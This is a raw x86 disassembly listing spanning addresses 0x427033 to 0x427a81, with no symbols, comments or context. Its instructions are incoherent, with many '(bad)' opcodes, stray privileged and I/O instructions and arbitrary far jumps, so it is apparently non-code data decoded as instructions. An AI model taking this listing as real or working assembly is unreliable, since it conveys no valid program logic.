  427033:	jge    0x42700e
	...
  427095:	add    BYTE PTR [ebp*2-0x8846ae6],cl
  42709c:	(bad)  
  42709d:	std    
  42709e:	stos   DWORD PTR es:[edi],eax
  42709f:	sbb    DWORD PTR [eax+0xee3f5c6],eax
  4270a5:	pop    edi
  4270a6:	and    DWORD PTR [eax+0x1070001],0x27170000
  4270b0:	es dec esp
  4270b2:	and    eax,0xd4b56de3
  4270b7:	xor    edx,DWORD PTR [esi+0x51a683de]
  4270bd:	and    dh,BYTE PTR [edx]
  4270bf:	inc    ebx
  4270c0:	lods   al,BYTE PTR ds:[esi]
  4270c1:	mov    ah,0xf
  4270c3:	test   eax,0xa0a9fdcd
  4270c8:	sbb    BYTE PTR [edx],bl
  4270ca:	push   esp
  4270cb:	mov    ch,0x71
  4270cd:	inc    eax
  4270ce:	jecxz  0x4270a1
  4270d0:	or     dl,BYTE PTR [edi]
  4270d2:	push   ds
  4270d3:	std    
  4270d4:	mov    bh,0xba
  4270d6:	sub    DWORD PTR [edi-0x5],ebp
  4270d9:	cmp    al,0xbf
  4270db:	pushf  
  4270dc:	and    al,0xdd
  4270de:	(bad)  
  4270df:	sbb    bh,dl
  4270e1:	jmp    0x2576:0x153b1fbc
  4270e8:	xchg   ebx,eax
  4270e9:	sbb    DWORD PTR [ebx+eax*8+0x30],ebp
  4270ed:	jbe    0x42715f
  4270ef:	sub    al,0xef
  4270f1:	aaa    
  4270f2:	dec    ecx
  4270f3:	inc    edx
  4270f4:	pop    ds
  4270f5:	loope  0x427122
  4270f7:	xor    dl,bh
  4270f9:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4270fb:	(bad)  
  4270fd:	xchg   BYTE PTR [edi-0x3f40de5d],ah
  427103:	std    
  427104:	xchg   BYTE PTR [edi],al
  427106:	imul   eax,DWORD PTR [ebp+0x4bd07df9],0x43
  42710d:	gs fwait
  42710f:	pop    esi
  427110:	mov    WORD PTR [eax],es
  427112:	shr    DWORD PTR [edx-0x4c35d4b5],cl
  427118:	mov    ah,0xf0
  42711a:	loopne 0x42719a
  42711c:	pop    es
  42711d:	daa    
  42711e:	aam    0x64
  427120:	add    ecx,edx
  427122:	sbb    bl,ch
  427124:	in     eax,dx
  427125:	mov    cl,BYTE PTR [edi+0x24]
  427128:	cld    
  427129:	xor    DWORD PTR [eax],ebx
  42712b:	sti    
  42712c:	mov    cs,ebx
  42712e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42712f:	das    
  427130:	lods   al,BYTE PTR ds:[esi]
  427131:	inc    esp
  427132:	les    ebx,FWORD PTR [esi-0x4e]
  427135:	mov    fs,WORD PTR [esi]
  427137:	xor    DWORD PTR [esi-0x2691e02e],esp
  42713d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42713e:	add    cl,BYTE PTR [edi]
  427140:	push   edx
  427141:	add    esi,edx
  427143:	push   ebx
  427144:	dec    edi
  427145:	out    0x3c,eax
  427147:	xlat   BYTE PTR ds:[ebx]
  427148:	js     0x4270e1
  42714a:	dec    edx
  42714b:	test   BYTE PTR [eax+edi*1-0x16],0x6e
  427150:	jecxz  0x427161
  427152:	adc    BYTE PTR [ebx-0x77021f81],bh
  427158:	dec    ebp
  427159:	pop    edi
  42715a:	xchg   ebx,eax
  42715b:	sbb    al,0x7a
  42715d:	mov    DWORD PTR [ebx],0x30bef7ee
  427163:	(bad)
  427166:	aas    
  427167:	xchg   esp,eax
  427168:	int    0x88
  42716a:	and    DWORD PTR [ebx-0x5ae26c74],edx
  427170:	lods   al,BYTE PTR ds:[esi]
  427171:	fsub   QWORD PTR [ebx+ebx*2+0x50e60859]
  427178:	out    dx,al
  427179:	cdq    
  42717a:	add    bh,BYTE PTR [ebx]
  42717c:	dec    esi
  42717d:	je     0x427131
  42717f:	sbb    eax,0x453302da
  427184:	mov    ds:0x27d49f35,al
  427189:	(bad)  
  42718a:	jno    0x42717f
  42718c:	imul   ebp,DWORD PTR [edx],0xcfb8e8dc
  427192:	sar    DWORD PTR fs:[edx],1
  427195:	(bad)  
  427196:	mov    ecx,0xfc250bc9
  42719b:	cs int 0x4d
  42719e:	mov    ebx,0x3ab11b4e
  4271a3:	jno    0x42721a
  4271a5:	push   eax
  4271a6:	in     eax,0xdd
  4271a8:	dec    edi
  4271a9:	jle    0x427163
  4271ab:	mov    ecx,0x1b3b3049
  4271b0:	push   DWORD PTR [eax-0x7c]
  4271b3:	mov    al,ds:0x7a
	...
  427214:	add    BYTE PTR [eax],al
  427216:	push   ds
  427217:	inc    ecx
  427218:	fdiv   QWORD PTR [edi+ebx*8+0x77eb7ebd]
  42721f:	push   0x6ddb0100
  427224:	push   edx
  427225:	out    0x88,eax
  427227:	mov    eax,ds:0x1070001
  42722c:	add    BYTE PTR [eax],al
  42722e:	xor    ah,0xe
  427231:	lea    esp,[ecx+ecx*1]
  427234:	mov    WORD PTR [eax],es
  427236:	cmp    al,0x2b
  427238:	pusha  
  427239:	pop    esi
  42723a:	push   edx
  42723b:	sub    edx,DWORD PTR [edx]
  42723d:	add    ecx,0xfffffffc
  427240:	or     BYTE PTR [esi],dl
  427242:	sub    edi,DWORD PTR [edi+0x21f95ef7]
  427248:	add    BYTE PTR [edi+esi*2-0x1dbecf7c],ch
  42724f:	shl    cl,0x9a
  427252:	rcr    BYTE PTR [ecx-0x1f],0xad
  427256:	lods   eax,DWORD PTR ds:[esi]
  427257:	add    dh,BYTE PTR [esi-0x35]
  42725a:	adc    DWORD PTR [eax+0x55],esi
  42725d:	bound  esi,QWORD PTR [edx+edi*8+0x3d]
  427261:	stos   DWORD PTR es:[edi],eax
  427262:	mov    ebp,0xdebcf4
  427267:	jns    0x4272ce
  427269:	cmp    al,0x5f
  42726b:	pop    ebx
  42726c:	sbb    eax,0x49ea9416
  427271:	test   al,0x8f
  427273:	aas    
  427274:	inc    edi
  427275:	jmp    0x48c95c22
  42727a:	dec    edx
  42727b:	or     BYTE PTR [eax+0x4ba20678],bl
  427281:	mov    ch,0x26
  427283:	inc    DWORD PTR [ebx]
  427285:	div    DWORD PTR [esi-0x23]
  427288:	mov    dl,0x10
  42728a:	cmp    al,0x60
  42728c:	cmp    BYTE PTR [ecx+ebp*4],al
  42728f:	cmp    DWORD PTR [edx+0x44ae91a],0xc3596533
  427299:	pop    ss
  42729a:	or     BYTE PTR [eax],cl
  42729c:	lea    ecx,ds:0x2a61a954
  4272a2:	(bad)  
  4272a3:	call   0x64d4dee2
  4272a8:	in     eax,0xf
  4272aa:	cmp    eax,ebp
  4272ac:	pushf  
  4272ad:	repnz in al,dx
  4272af:	adc    BYTE PTR [ecx-0x73dfaf55],bh
  4272b5:	or     al,0xec
  4272b7:	xchg   DWORD PTR [edi],esi
  4272b9:	sbb    BYTE PTR [ebx],ch
  4272bb:	pop    ebp
  4272bc:	int    0xcd
  4272be:	fild   WORD PTR [ebp-0x7c]
  4272c1:	pop    ecx
  4272c2:	scas   eax,DWORD PTR es:[edi]
  4272c3:	lods   al,BYTE PTR ds:[esi]
  4272c4:	jno    0x42733d
  4272c6:	jge    0x42731d
  4272c8:	(bad)  [edx+edx*4]
  4272cb:	pop    edi
  4272cc:	mov    edx,gs
  4272ce:	(bad)  
  4272cf:	stc    
  4272d0:	retf   
  4272d1:	inc    ecx
  4272d2:	lahf   
  4272d3:	push   eax
  4272d4:	mov    dh,0x5a
  4272d6:	mov    ds:0xd9bec3d7,eax
  4272db:	fcompp 
  4272dd:	gs gs cmc 
  4272e0:	iret   
  4272e1:	mov    bl,0x13
  4272e3:	test   edx,eax
  4272e5:	(bad)  
  4272e6:	dec    esp
  4272e7:	or     al,BYTE PTR [edx+edi*4+0x14]
  4272eb:	xchg   esp,eax
  4272ec:	xlat   BYTE PTR ds:[ebx]
  4272ed:	call   0xd2d7:0x934dad5b
  4272f4:	jno    0x42733c
  4272f6:	push   ecx
  4272f7:	rcl    DWORD PTR [ebx+0x685fb44b],cl
  4272fd:	cmp    cl,BYTE PTR ds:0xc99a6f0
  427303:	loope  0x4272e6
  427305:	in     al,0x97
  427307:	pop    ebx
  427308:	repnz and eax,0x1970af41
  42730e:	ror    esp,cl
  427310:	jmp    0x42738c
  427312:	aaa    
  427313:	minps  xmm5,XMMWORD PTR [ecx-0x5f64b5fb]
  42731a:	sbb    eax,0x6536ce47
  42731f:	js     0x4272b8
  427321:	mov    eax,ds:0x118c7ce9
  427326:	cmc    
  427327:	test   BYTE PTR [edx+ebp*4],al
  42732a:	lahf   
  42732b:	sbb    BYTE PTR [ebx+0x7c],ah
  42732e:	fs and dh,al
  427331:	push   0x5af42d
	...
  427396:	adc    bl,BYTE PTR ds:0xaf3f8832
  42739c:	mov    edx,0x57f28d9f
  4273a1:	push   esp
  4273a2:	in     eax,dx
  4273a3:	mov    ecx,0xa28fb580
  4273a8:	add    DWORD PTR [eax],eax
  4273aa:	pop    es
  4273ab:	add    DWORD PTR [eax],eax
  4273ad:	add    BYTE PTR [ecx-0x1d],bl
  4273b0:	mov    al,ds:0x8ac1e7a1
  4273b5:	es and edx,ebp
  4273b8:	shr    ch,1
  4273ba:	(bad)  
  4273bb:	std    
  4273bc:	out    0x59,al
  4273be:	pop    ss
  4273bf:	add    al,0x98
  4273c1:	imul   eax,DWORD PTR [esi-0xb528f6d],0x9ff2d5a0
  4273cb:	xchg   ebx,eax
  4273cc:	dec    esp
  4273cd:	xchg   esp,eax
  4273ce:	inc    ebx
  4273cf:	xchg   edi,eax
  4273d0:	pop    esp
  4273d1:	add    cl,BYTE PTR [edx+0x6a34828c]
  4273d7:	push   edi
  4273d8:	sub    BYTE PTR [edi],0x44
  4273db:	or     BYTE PTR [ebx],bh
  4273dd:	push   eax
  4273de:	jo     0x42741f
  4273e0:	scas   eax,DWORD PTR es:[edi]
  4273e1:	daa    
  4273e2:	sbb    al,BYTE PTR [edx]
  4273e4:	in     eax,dx
  4273e5:	jno    0x4273b7
  4273e7:	pop    es
  4273e8:	int3   
  4273e9:	xor    al,0xc2
  4273eb:	aam    0x82
  4273ed:	aaa    
  4273ee:	fcom   DWORD PTR [edi+ebp*1-0x64]
  4273f2:	sbb    ecx,DWORD PTR [eax]
  4273f4:	pushf  
  4273f5:	bound  eax,QWORD PTR [ecx-0x2f]
  4273f8:	aad    0x9e
  4273fa:	bound  edi,QWORD PTR [edx]
  4273fc:	jb     0x42740d
  4273fe:	icebp  
  4273ff:	jge    0x427407
  427401:	test   BYTE PTR [ebx+edi*2-0x1f0f5bf3],bh
  427408:	sub    al,0x6c
  42740a:	dec    edi
  42740b:	in     al,dx
  42740c:	stos   DWORD PTR es:[edi],eax
  42740d:	or     al,BYTE PTR [ebx-0x1dee07a0]
  427413:	aaa    
  427414:	outs   dx,BYTE PTR ds:[esi]
  427415:	pop    eax
  427416:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427417:	lock sub cl,BYTE PTR [edi+0x58fe20b8]
  42741e:	popf   
  42741f:	pop    ebx
  427420:	mov    esp,0xdc218240
  427425:	sbb    al,0xb1
  427427:	sbb    edx,DWORD PTR [edx+0xf]
  42742a:	jge    0x427453
  42742c:	mov    ecx,gs
  42742e:	lea    edi,[ebp+0x5b]
  427431:	js     0x42743a
  427433:	jmp    0x4273fc
  427435:	ret    0xc06a
  427438:	mov    ch,0x1a
  42743a:	fcomip st,st(0)
  42743c:	fwait
  42743d:	pop    ebp
  42743e:	imul   edi,DWORD PTR [eax],0x6e
  427441:	sar    BYTE PTR [esi-0x7cdb4640],1
  427447:	stos   BYTE PTR es:[edi],al
  427448:	ins    DWORD PTR es:[edi],dx
  427449:	jns    0x4273eb
  42744b:	mov    ecx,0xdc46e00c
  427450:	sbb    edx,DWORD PTR [ecx+0x27]
  427453:	adc    bl,0xbf
  427456:	fsub   QWORD PTR [esi]
  427458:	push   ds
  427459:	push   cs
  42745a:	mov    DWORD PTR [esi],edi
  42745c:	into   
  42745d:	sbb    ebx,DWORD PTR [eax+0x8b00c98]
  427463:	jmp    0x2400:0x2eb87a00
  42746a:	mov    BYTE PTR [edx-0x2deebf84],al
  427470:	cmp    eax,DWORD PTR [eax]
  427472:	push   cs
  427473:	sbb    ah,bh
  427475:	and    eax,0xceb17f8d
  42747a:	adc    BYTE PTR [edi+0x5e373f7d],dh
  427480:	lahf   
  427481:	cmp    BYTE PTR [edi-0x24],bh
  427484:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427485:	xchg   esp,eax
  427486:	and    bl,BYTE PTR [eax-0x94e6886]
  42748c:	cli    
  42748d:	jo     0x427484
  42748f:	popa   
  427490:	inc    esp
  427491:	popa   
  427492:	ror    BYTE PTR [ebx],0xec
  427495:	pop    edx
  427496:	xor    DWORD PTR [edi-0x67],edi
  427499:	arpl   WORD PTR [ecx],cx
  42749b:	mov    esp,0xa0ad2ab1
  4274a0:	pusha  
  4274a1:	pushf  
  4274a2:	xchg   ebx,eax
  4274a3:	popa   
  4274a4:	jbe    0x427454
  4274a6:	in     al,dx
  4274a7:	jmp    0x427448
  4274a9:	mov    bl,0x66
  4274ab:	xchg   DWORD PTR [edi+0x109e7bc2],ebx
  4274b1:	lods   eax,DWORD PTR ds:[esi]
  4274b2:	xor    edi,DWORD PTR [ebx+0xe]
	...
  427514:	add    BYTE PTR [eax],al
  427516:	pop    esp
  427517:	test   al,0xc0
  427519:	stos   DWORD PTR es:[edi],eax
  42751a:	hlt    
  42751b:	jmp    0x42759c
  42751d:	jmp    DWORD PTR [ecx+0x20a6f50a]
  427523:	push   ecx
  427524:	les    edx,FWORD PTR ds:0x1a396
  42752a:	pop    es
  42752b:	add    DWORD PTR [eax],eax
  42752d:	add    BYTE PTR [edx-0x10],cl
  427530:	fcom   QWORD PTR [edi]
  427532:	push   esp
  427533:	adc    eax,0x3aae8dfd
  427538:	(bad)  
  427539:	fnstenv [esi-0x6a]
  42753c:	stc    
  42753d:	les    ebp,FWORD PTR [eax]
  42753f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427540:	xchg   esi,eax
  427541:	outs   dx,BYTE PTR ds:[esi]
  427542:	mov    ds:0xed2249f1,eax
  427547:	(bad)  
  427548:	jle    0x427563
  42754a:	mov    ah,0xa3
  42754c:	or     esi,eax
  42754e:	enter  0xa3b,0x2d
  427552:	in     eax,0x68
  427554:	jnp    0x4274f3
  427556:	and    edx,DWORD PTR [ebx]
  427558:	rcr    eax,0x21
  42755b:	cmc    
  42755c:	or     bl,al
  42755e:	outs   dx,DWORD PTR ds:[esi]
  42755f:	xchg   BYTE PTR [esi+0x51],cl
  427562:	mov    ds:0x78de61d5,eax
  427567:	bound  ebx,QWORD PTR [ebx-0x39]
  42756a:	jmp    0x427549
  42756c:	(bad)  
  42756d:	in     eax,0x57
  42756f:	add    ch,BYTE PTR [esi+0x5e]
  427572:	sub    BYTE PTR [ebx],dl
  427574:	cmp    edi,DWORD PTR [edx]
  427576:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427577:	sub    esi,eax
  427579:	push   ecx
  42757a:	push   ebx
  42757b:	or     ebx,DWORD PTR ds:0xde079e52
  427581:	ret    0xa113
  427584:	shl    ecx,cl
  427586:	sub    DWORD PTR [ecx-0x6e2cf439],esp
  42758c:	inc    DWORD PTR [esi]
  42758e:	inc    ecx
  42758f:	and    bh,BYTE PTR [esi+0x2899bc3f]
  427595:	out    dx,eax
  427596:	xchg   DWORD PTR [eax+0x65],esi
  427599:	test   DWORD PTR [edi+0x3d],0x2724938d
  4275a0:	xor    cl,BYTE PTR [edx]
  4275a2:	test   al,0x33
  4275a4:	jle    0x427560
  4275a6:	mov    ebx,0xa39dd0f0
  4275ab:	and    cl,al
  4275ad:	or     al,0xd1
  4275af:	div    BYTE PTR [ebp-0x54dfee3e]
  4275b5:	jo     0x4275ba
  4275b7:	int    0x4c
  4275b9:	fistp  QWORD PTR [eax-0x3b]
  4275bc:	addr16 inc ecx
  4275be:	aas    
  4275bf:	repnz mov ah,0x23
  4275c2:	mov    edi,0x728c7b66
  4275c7:	jg     0x4275c8
  4275c9:	mov    al,bh
  4275cb:	pop    ebp
  4275cc:	ja     0x427570
  4275ce:	lock pop ecx
  4275d0:	jle    0x427619
  4275d2:	loop   0x4275ff
  4275d4:	icebp  
  4275d5:	cmp    bl,ch
  4275d7:	cld    
  4275d8:	cmc    
  4275d9:	mov    ds:0x4dc599a2,al
  4275de:	push   si
  4275e0:	adc    bl,BYTE PTR [ebx-0x5f]
  4275e3:	pop    edx
  4275e4:	int    0x5a
  4275e6:	pop    edi
  4275e7:	mov    eax,ds:0x92a8c282
  4275ec:	add    eax,0x6160feac
  4275f1:	xchg   ebx,eax
  4275f2:	or     esi,DWORD PTR [esi-0x53]
  4275f5:	push   edx
  4275f6:	mov    ebp,0x9c6c5fbe
  4275fb:	and    DWORD PTR [ecx-0x7b],0xffffff9f
  4275ff:	stc    
  427600:	out    dx,al
  427601:	stc    
  427602:	and    BYTE PTR ds:0x43d7d8a3,0xc3
  427609:	mov    edx,0x7b18fee3
  42760e:	jne    0x4275a8
  427610:	sub    bl,dh
  427612:	lea    ebp,[ebx]
  427614:	or     DWORD PTR [edx-0x3ead285b],edi
  42761a:	and    al,0xcc
  42761c:	lods   al,BYTE PTR ds:[esi]
  42761d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42761e:	cmp    BYTE PTR [edi+ebp*4],dl
  427621:	popa   
  427622:	stos   BYTE PTR es:[edi],al
  427623:	iret   
  427624:	push   0x47
  427626:	mov    dl,0xcb
  427628:	sub    DWORD PTR [edi+0x3e100d7d],ebx
  42762e:	push   ss
  42762f:	bound  esp,QWORD PTR [edi+0x3b78686b]
	...
  427695:	add    BYTE PTR [ecx],al
  427697:	push   esi
  427698:	nop
  427699:	out    dx,al
  42769a:	xlat   BYTE PTR ds:[ebx]
  42769b:	out    dx,al
  42769c:	jg     0x42769d
  42769e:	xchg   edi,eax
  42769f:	in     eax,dx
  4276a0:	imul   ebx,eax,0x4ff5e50d
  4276a6:	popf   
  4276a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4276a8:	add    DWORD PTR [eax],eax
  4276aa:	pop    es
  4276ab:	add    DWORD PTR [eax],eax
  4276ad:	add    BYTE PTR [esi],dh
  4276af:	add    eax,0x4afe6b1d
  4276b4:	mov    ecx,0xb5a4ace1
  4276b9:	std    
  4276ba:	ret    0x145e
  4276bd:	jp     0x427736
  4276bf:	in     al,dx
  4276c0:	push   edi
  4276c1:	mov    BYTE PTR [ecx],bl
  4276c3:	es jnp 0x427652
  4276c6:	mov    ecx,0xa9c60180
  4276cb:	lods   eax,DWORD PTR ds:[esi]
  4276cc:	sub    eax,DWORD PTR [esi+edx*8]
  4276cf:	sbb    al,0x16
  4276d1:	pop    edi
  4276d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4276d3:	dec    eax
  4276d4:	mov    eax,0xff5438f8
  4276d9:	dec    eax
  4276da:	or     eax,0x67fbc0a3
  4276df:	cmp    al,0x28
  4276e1:	popf   
  4276e2:	stos   DWORD PTR es:[edi],eax
  4276e3:	pop    es
  4276e4:	and    dl,BYTE PTR ss:[esi+0x48ac45e]
  4276eb:	cmp    DWORD PTR [ecx+ebx*4],esi
  4276ee:	push   ecx
  4276ef:	add    eax,0x1ec78ed0
  4276f4:	cmc    
  4276f5:	cdq    
  4276f6:	jb     0x427732
  4276f8:	dec    ebx
  4276fa:	pop    eax
  4276fb:	jl     0x427760
  4276fd:	sbb    al,0x58
  4276ff:	aas    
  427700:	sbb    cl,BYTE PTR [ecx]
  427702:	jg     0x4276c1
  427704:	lahf   
  427705:	ret    
  427706:	mov    bl,0x41
  427708:	mov    eax,0x93e75fc3
  42770d:	pop    ecx
  42770e:	lahf   
  42770f:	aam    0xfb
  427711:	sahf   
  427712:	loop   0x427769
  427714:	comiss xmm6,DWORD PTR [edi-0x53]
  427718:	stos   DWORD PTR es:[edi],eax
  427719:	in     al,dx
  42771a:	add    BYTE PTR [edi+0x5d],al
  42771d:	lock gs ss cmp eax,0xe9120f8a
  427725:	cwde   
  427726:	add    eax,0xf9aa2947
  42772b:	mov    bh,0xf2
  42772d:	and    al,0x38
  42772f:	in     eax,0xa4
  427731:	pusha  
  427732:	mov    WORD PTR [edx-0x4fd955e1],gs
  427738:	imul   ecx,DWORD PTR [esi-0x1ba75fb1],0x21e23ab5
  427742:	pop    esp
  427743:	mov    eax,ds:0x42dca87d
  427748:	fiadd  WORD PTR [eax+edi*8+0x3e]
  42774c:	jb     0x4277ca
  42774e:	clc    
  42774f:	stos   BYTE PTR es:[edi],al
  427750:	jb     0x427787
  427752:	push   ecx
  427753:	scas   al,BYTE PTR es:[edi]
  427754:	rol    DWORD PTR [esi+0x7c],1
  427757:	push   ebx
  427758:	pop    ecx
  427759:	jmp    0x786b8bb9
  42775e:	push   ebx
  42775f:	or     bl,cl
  427761:	jecxz  0x4277d1
  427763:	adc    esi,ebp
  427765:	or     edx,esi
  427767:	mov    cl,0x57
  427769:	inc    ebx
  42776a:	sub    BYTE PTR [ebp+0x2a7cd561],bl
  427770:	jbe    0x4277a8
  427772:	mov    ds:0x66178195,eax
  427777:	sbb    ecx,DWORD PTR [esi]
  427779:	push   edx
  42777a:	xor    eax,0xecbb8afa
  42777f:	or     esp,DWORD PTR [esi]
  427781:	je     0x4277b2
  427783:	mov    cl,BYTE PTR fs:[eax]
  427786:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427787:	push   0x3b
  427789:	test   eax,0xdaf7bc69
  42778e:	fs ret 0x19bb
  427792:	adc    esi,DWORD PTR [edi+0x1b5cef5f]
  427798:	nop
  427799:	push   DWORD PTR [eax+0x13]
  42779c:	push   edx
  42779d:	(bad)  
  42779e:	stc    
  42779f:	inc    esi
  4277a0:	rcl    bh,0xd2
  4277a3:	test   DWORD PTR [edx],eax
  4277a5:	jns    0x427737
  4277a7:	ror    DWORD PTR [edi+0x32fc9ffb],1
  4277ad:	add    cl,BYTE PTR [esi-0xd]
  4277b0:	cdq    
  4277b1:	lods   eax,DWORD PTR ds:[esi]
  4277b2:	mov    esi,0xe4da
	...
  427813:	add    BYTE PTR [eax],al
  427815:	add    BYTE PTR [edx],bl
  427817:	mov    cl,BYTE PTR [ebx]
  427819:	inc    ebp
  42781a:	fwait
  42781b:	lds    ebx,FWORD PTR [esi-0x21]
  42781e:	push   edx
  42781f:	sar    DWORD PTR [edi+eiz*1],1
  427822:	mov    edi,0xa409bdc7
  427827:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427828:	add    DWORD PTR [eax],eax
  42782a:	pop    es
  42782b:	add    DWORD PTR [eax],eax
  42782d:	add    BYTE PTR [ecx+0x3fa22682],ah
  427833:	js     0x42782c
  427835:	(bad)  
  427836:	mov    edi,0x8abace75
  42783b:	pop    edi
  42783c:	inc    edi
  42783d:	mov    ds:0x4a815d3,ax
  427843:	mov    esi,0xe7133d52
  427848:	jl     0x427893
  42784a:	inc    ecx
  42784b:	stos   BYTE PTR es:[edi],al
  42784c:	pop    ds
  42784d:	out    dx,al
  42784e:	and    DWORD PTR [ecx],esp
  427850:	fwait
  427851:	dec    esp
  427852:	adc    esi,DWORD PTR [eax-0x14]
  427855:	cli    
  427856:	xchg   ebp,eax
  427857:	mov    ebp,0x3912db6a
  42785c:	and    DWORD PTR [ebp+0x1c],edx
  42785f:	pusha  
  427860:	dec    edx
  427861:	jo     0x42787b
  427863:	test   al,0x25
  427865:	push   edx
  427866:	add    bl,cl
  427868:	not    BYTE PTR [edi-0x7]
  42786b:	mov    ch,al
  42786d:	mov    ecx,0x9098dc06
  427872:	xlat   BYTE PTR ds:[ebx]
  427873:	push   edi
  427874:	lds    edi,FWORD PTR [esi]
  427876:	int    0x48
  427878:	wbinvd 
  42787a:	mov    ds:0x90f5fc1,eax
  42787f:	or     al,0x7b
  427881:	mov    WORD PTR ds:[ecx-0x5007f29],?
  427888:	(bad)  
  427889:	jb     0x427907
  42788b:	sti    
  42788c:	xchg   edi,eax
  42788d:	mov    bl,0x2e
  42788f:	test   DWORD PTR [edx+0x47a10e18],ecx
  427895:	shr    dh,1
  427897:	push   ebx
  427898:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427899:	push   ds
  42789a:	rol    BYTE PTR [esi-0x68],cl
  42789d:	xor    edi,ecx
  42789f:	ficomp DWORD PTR [esi+ebp*4+0x2a909f25]
  4278a6:	add    DWORD PTR [esi],esi
  4278a8:	jnp    0x427833
  4278aa:	mov    edx,0x167a8163
  4278af:	mov    edx,DWORD PTR [ecx+eiz*8]
  4278b2:	std    
  4278b3:	or     eax,0x8704fa01
  4278b8:	xchg   ebx,eax
  4278b9:	daa    
  4278ba:	xor    bh,BYTE PTR [ebp+ebx*2+0x32f1d268]
  4278c1:	pusha  
  4278c2:	push   edx
  4278c3:	pusha  
  4278c4:	inc    esp
  4278c5:	xor    BYTE PTR [ebx-0x2a],bh
  4278c8:	dec    eax
  4278c9:	(bad)
  4278cd:	ret    0x3815
  4278d0:	test   bh,bl
  4278d2:	cmp    eax,0x149950e
  4278d7:	mov    esi,0x2d0bef99
  4278dc:	out    0x20,eax
  4278de:	and    eax,0xf0486b4c
  4278e3:	arpl   WORD PTR [edi+edx*4+0x289b80c7],ax
  4278ea:	sub    eax,0x1e5c5a55
  4278ef:	addr16 push ss
  4278f1:	test   al,0x30
  4278f3:	pop    ecx
  4278f4:	mov    ds:0xef581d81,al
  4278f9:	aas    
  4278fa:	jge    0x427972
  4278fc:	and    edi,DWORD PTR [eax-0x58d4dfcc]
  427902:	dec    edi
  427903:	cmp    BYTE PTR [ebx-0x6a0250c5],al
  427909:	test   BYTE PTR [edi+0x3b4c8166],cl
  42790f:	icebp  
  427910:	sub    esp,DWORD PTR [edx+0x62]
  427913:	hlt    
  427914:	les    ecx,FWORD PTR [esi]
  427916:	mov    ds:0x89eac966,eax
  42791b:	in     eax,0x8b
  42791d:	adc    ecx,DWORD PTR [edi]
  42791f:	cmc    
  427920:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427921:	je     0x4278e5
  427923:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427924:	gs and eax,0x1daf6d9a
  42792a:	mov    ds:0x3a590e45,eax
  42792f:	mov    eax,0xdec5c66d
  427934:	or     BYTE PTR [eax],al
	...
  427996:	call   0xdea3:0xffa3ffdd
  42799d:	std    
  42799e:	in     eax,0x63
  4279a0:	mov    ebx,0xaca87cd0
  4279a5:	retf   0xa6ab
  4279a8:	add    DWORD PTR [eax],eax
  4279aa:	pop    es
  4279ab:	add    DWORD PTR [eax],eax
  4279ad:	add    bl,ah
  4279af:	push   esi
  4279b0:	fcom   st(5)
  4279b2:	mov    BYTE PTR [ecx+0x32cc1654],cl
  4279b8:	adc    ah,BYTE PTR [esi]
  4279ba:	mov    al,ds:0x4624b205
  4279bf:	push   esi
  4279c0:	bound  esp,QWORD PTR ds:0xd5ec9f5e
  4279c6:	sbb    esp,esp
  4279c8:	xor    dh,BYTE PTR [ebx-0x74]
  4279cb:	test   al,0x4e
  4279cd:	scas   eax,DWORD PTR es:[edi]
  4279ce:	(bad)  
  4279cf:	mov    ds:0x8152fbea,al
  4279d4:	jle    0x4279cd
  4279d6:	lock mul DWORD PTR [ebx]
  4279d9:	add    DWORD PTR [ecx+ebx*1-0x55a880f3],eax
  4279e0:	and    edi,DWORD PTR [ebx]
  4279e2:	pop    edi
  4279e3:	js     0x427a44
  4279e5:	mov    dh,0x18
  4279e7:	cmp    al,0x19
  4279e9:	jns    0x4279bb
  4279eb:	fldenv [esi-0x2b]
  4279ee:	jp     0x427a15
  4279f0:	ins    BYTE PTR es:[edi],dx
  4279f1:	rcr    BYTE PTR [edi],1
  4279f3:	test   DWORD PTR [eax-0x47fbf1a5],esp
  4279f9:	sub    esi,DWORD PTR [edx+eiz*4]
  4279fc:	and    eax,0x8ba9bec8
  427a01:	popf   
  427a02:	pop    eax
  427a03:	pop    ss
  427a04:	cs call 0x56c8:0x10b9e984
  427a0c:	fadd   DWORD PTR [eax-0x5091953]
  427a12:	mov    DWORD PTR [esi-0x62486bce],0xafe9f081
  427a1c:	shl    BYTE PTR [eax+0x18],1
  427a1f:	adc    eax,0x1e3be407
  427a24:	pop    ecx
  427a25:	push   edi
  427a26:	sbb    BYTE PTR [edi-0x16],dl
  427a29:	pop    es
  427a2a:	xchg   esi,eax
  427a2b:	popa   
  427a2c:	pop    ebp
  427a2d:	inc    esp
  427a2e:	enter  0xed35,0x32
  427a32:	and    cl,0xed
  427a35:	repz jnp 0x4279d4
  427a38:	aad    0xe3
  427a3a:	fwait
  427a3b:	push   ecx
  427a3c:	jbe    0x427a1e
  427a3e:	push   esi
  427a3f:	shl    BYTE PTR [esi-0x6a],0x3d
  427a43:	in     al,0x7b
  427a45:	xor    DWORD PTR [esi-0x8],eax
  427a48:	pusha  
  427a49:	hlt    
  427a4a:	mov    esp,0x99560bc9
  427a4f:	cli    
  427a50:	jno    0x427a7b
  427a52:	push   0x8b354a9f
  427a57:	mov    bl,0x96
  427a59:	pop    ebp
  427a5a:	add    BYTE PTR [esi-0x49],bl
  427a5d:	sub    DWORD PTR [ebx],edx
  427a5f:	scas   eax,DWORD PTR es:[edi]
  427a60:	or     BYTE PTR [edi],ch
  427a62:	mov    ebp,0xfda38bd5
  427a67:	(bad)  
  427a69:	mov    ds:0x9f34262f,eax
  427a6e:	pop    ebx
  427a6f:	mov    ?,WORD PTR [ebp-0x745e82b]
  427a75:	neg    eax
  427a77:	mov    bl,0x5a
  427a79:	into   
  427a7a:	push   0x28735462
  427a7f:	test   DWORD PTR [edx],esp
  427a81:	cld    
